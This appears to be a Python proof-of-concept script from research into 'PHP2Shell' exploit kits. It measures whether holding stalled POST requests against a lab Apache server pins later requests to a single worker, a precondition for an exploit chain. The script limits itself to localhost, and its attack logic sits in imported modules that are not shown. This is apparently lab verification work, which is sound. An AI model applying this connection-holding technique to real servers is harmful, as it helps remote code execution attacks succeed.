#!/usr/bin/env python3
"""Verify worker pinning against a lab target.

Wiz (2026-10-27) reports worker pinning as one of two barriers that keep
public PHP2Shell kits from working in the wild: "consecutive exploit requests
must reach the same Apache child process while the required session state
persists." Public kits hold the other workers with stalled partial requests
(9bie: 149 holders; devploit: N-1 keep-alive connections).

This POC measures it directly with the lab's `worker_id.php` oracle:

  control  : sample N requests with no holders -> many PIDs
  pinned   : hold `--holders` stalled POSTs, sample again -> one PID

Usage:
  python3 poc/verify_worker_pinning.py --target http://127.0.0.1:18110 --holders 3
  python3 poc/verify_worker_pinning.py --target http://127.0.0.1:18097 --holders 3

Lab targets only (localhost / 127.*); no remote orchestration.
"""

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from php2shell import probe
from php2shell.pinning import pinning_report


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18110")
    ap.add_argument("--path", default="/index.php", help="holder request path")
    ap.add_argument("--worker-id", default="/worker_id.php")
    ap.add_argument("--holders", type=int, default=3)
    ap.add_argument("--control-samples", type=int, default=16)
    ap.add_argument("--pinned-samples", type=int, default=12)
    args = ap.parse_args()

    scheme, host, port = probe.parse_target(args.target)
    if scheme != "http":
        sys.exit("lab targets are plain HTTP")

    print("[*] Worker pinning verification")
    print(f"    target: {host}:{port}  holders: {args.holders}")
    print()

    r = pinning_report(
        host, port,
        holders=args.holders,
        worker_id_path=args.worker_id,
        control_samples=args.control_samples,
        pinned_samples=args.pinned_samples,
        path=args.path,
    )

    print(f"[1] Control (no holders): {r['control_distinct']} distinct PIDs"
          f" across {len(r['control_pids'])} responses")
    print(f"    {sorted(set(r['control_pids']))}")
    print()
    print(f"[2] Pinned ({args.holders} stalled holders):"
          f" {r['pinned_distinct']} distinct PID(s) across"
          f" {len(r['pinned_pids'])} responses")
    print(f"    {sorted(set(r['pinned_pids']))}")
    print()

    if r["pinned"] and r["control_distinct"] > 1:
        print("[EVIDENCE] WORKER PINNING REPRODUCED")
        print(f"    - unheld requests spread over {r['control_distinct']} workers;")
        print(f"    - with {args.holders} holders, every request landed on pid"
              f" {r['pinned_pids'][0]}.")
        print("    - This is the 9bie/devploit primitive: N-1 stalled")
        print("      connections leave exactly one worker for the chain.")
        print("    - Honest ceiling: Apache prefork at 4 workers here; the")
        print("      public default is 150 (149 holders). FPM needs")
        print("      `fastcgi_request_buffering off` at the frontend.")
        return 0
    if r["pinned"] and r["control_distinct"] == 1:
        print("[*] Target is single-worker (or already pinned): pinning is a")
        print("    no-op here. Use a multi-worker lab (lab-pinned/:18097 or")
        print("    lab-pure-modphp/:18110) to demonstrate the primitive.")
        return 0
    print("[!] Pinning not demonstrated. Check:")
    print("    - target has >1 workers and the identity endpoint responds;")
    print("    - holders < MaxRequestWorkers (leave one free);")
    print("    - FPM frontends need `fastcgi_request_buffering off;`.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
